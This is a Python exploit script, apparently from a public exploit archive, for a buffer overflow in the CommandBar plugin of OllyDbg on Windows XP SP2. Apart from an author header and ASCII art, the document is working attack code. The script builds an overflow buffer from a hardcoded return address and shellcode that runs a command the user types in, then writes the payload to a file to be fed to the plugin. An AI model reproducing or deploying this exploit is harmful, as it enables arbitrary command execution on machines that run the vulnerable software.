# -*- coding: utf-8 -*-
"""
#[+] Author: Hykatza
#[+] Title: Vulnerability Buffer Overflow  in Plugin CommandBar for ollydbg
#[+] Date: 28/01/2015
#[+] Type: Exploit
#[+] Download Vulnerable App: http://www.openrce.org/downloads/download_file/105
#[+] Version: 3.00.108
#[+] Tested on: WinXp 32bit SP2
#[+] Friendly sites: untalhykatza.blogspot.mx
#[+] Twitter: @hykatza
=====================================================

         .
         \'~~~-,
          \    '-,_
           \ /\    `~'~''\          M Ãˆ X I C O
           _\ \\          \/~\
           \__ \\             \
              \ \\.             \
               \ \ \             `~~
                '\\ \.             /
                 L \  \            |
                  \_\  \           |             _.----,
                        |  hykatza  \           !     /
                       '._  00101    \_      __/    _/
                          \_           ''--''    __/
                            \.__                |
                                ''.__  __.._   __\
                                     ''     './  `
=====================================================
"""
import random
import sys
class Exploit:
    def __init__(self):
        self.limit=218
        self.eip="\x41\xB1\xD3\x77"
        self.junk="\x41"*3+self.eip+"\x41"*4
        self.preshellcode="\xcc"*4
        self.lc=3
        self.cmd=raw_input("Ingresa comando a ejecutar: ")
        if(len(self.cmd)<3):
            self.lc=0x1c-(self.lc-len(self.cmd))
        elif(len(self.cmd)>3):
            self.lc=0x1c+(len(self.cmd)-self.lc)
        else:
            self.lc=0x1c
        self.cmdl=chr(self.lc)
        self.shellcode=(
            "\x33\xC0\x89\x44\x24"+self.cmdl+
            "\xeB\x02\xBA\xC7\x93"
            "\xBF\x77\xFF\xD2\xCC"
            "\xE8\xF3\xFF\xFF\xFF"+self.cmd
        )
        self.shellcode=self.preshellcode+self.shellcode
        self.shellcode=self.shellcode+"\xcc"*(218-len(self.shellcode))
        self.eip2="\x74\x80\x97\x7c"
        self.alph="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
        self.rand=random.randrange(0,len(self.alph))
        self.char=hex(ord(self.alph[self.rand])).replace('0x','\\x')
        self.char=self.char.decode('string-escape')
        self.restbuffer=self.char*16+self.eip2
        self.buffer=self.junk+self.shellcode
    def run(self):
        data=self.buffer+self.restbuffer
        print(data)
        return data
        
def main(argv):
    exploit=Exploit()
    file=open('exploit_olly_cmdB_WXP_SP2.txt','w+')
    file.write(exploit.run())
    file.close()
if __name__=="__main__":
    main(sys.argv)
